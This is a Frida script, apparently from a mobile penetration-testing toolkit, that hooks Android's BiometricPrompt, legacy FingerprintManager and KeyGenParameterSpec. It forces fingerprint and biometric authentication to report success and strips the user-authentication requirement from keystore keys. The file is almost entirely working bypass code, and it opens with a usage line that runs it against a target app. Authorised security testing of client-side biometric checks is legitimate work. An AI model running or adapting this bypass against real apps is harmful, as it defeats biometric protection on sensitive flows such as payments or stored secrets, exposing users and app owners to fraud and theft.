/*
 * alab · android/biometric-bypass.js
 *
 * Bypass BiometricPrompt + FingerprintManager auth-success callbacks.
 * Useful when an app gates a sensitive flow behind biometrics with
 * client-side success checking (no server cryptographic challenge).
 *
 * Usage:   frida -U -f com.target.app -l biometric-bypass.js --no-pause
 *
 * Adapted from:
 *   - Fingerprint bypass — st4nly0n / WhiteHatTalk write-ups
 *   - sensepost/objection (android biometric_bypass)
 *     https://github.com/sensepost/objection/blob/master/agent/src/android/userinterface.ts
 */

Java.perform(function () {
    var C = '[biometric-bypass]';

    // ── BiometricPrompt (API 28+) ─────────────────────────────────
    try {
        var BP = Java.use('androidx.biometric.BiometricPrompt');
        var BPResult = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');
        BP.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo')
          .implementation = function (info) {
              console.log(C, 'androidx BiometricPrompt.authenticate → forcing success');
              var cb = this.mAuthenticationCallback.value;
              if (cb !== null) {
                  // Construct a fake AuthenticationResult — ctor varies by version
                  cb.onAuthenticationSucceeded(BPResult.$new(null, 1));
              }
          };
    } catch (e) { }

    // ── android.hardware.biometrics.BiometricPrompt (framework) ───
    try {
        var FBP = Java.use('android.hardware.biometrics.BiometricPrompt');
        FBP.authenticate.overload(
            'android.os.CancellationSignal','java.util.concurrent.Executor',
            'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback'
        ).implementation = function (cancel, exec, cb) {
            console.log(C, 'framework BiometricPrompt.authenticate → success');
            var R = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
            cb.onAuthenticationSucceeded(R.$new(null, 1));
        };
    } catch (e) { }

    // ── FingerprintManager (legacy, API 23-27) ────────────────────
    try {
        var FPM = Java.use('android.hardware.fingerprint.FingerprintManager');
        FPM.authenticate.overload(
            'android.hardware.fingerprint.FingerprintManager$CryptoObject',
            'android.os.CancellationSignal','int',
            'android.hardware.fingerprint.FingerprintManager$AuthenticationCallback',
            'android.os.Handler'
        ).implementation = function (crypto, cancel, flags, cb, h) {
            console.log(C, 'FingerprintManager.authenticate → success');
            var R = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');
            cb.onAuthenticationSucceeded(R.$new(crypto, 0));
        };
    } catch (e) { }

    // ── KeyGenParameterSpec.setUserAuthenticationRequired(false) ──
    try {
        var KGB = Java.use('android.security.keystore.KeyGenParameterSpec$Builder');
        KGB.setUserAuthenticationRequired.implementation = function (b) {
            return this.setUserAuthenticationRequired.call(this, false);
        };
    } catch (e) { }

    console.log(C, 'biometric bypass installed.');
});
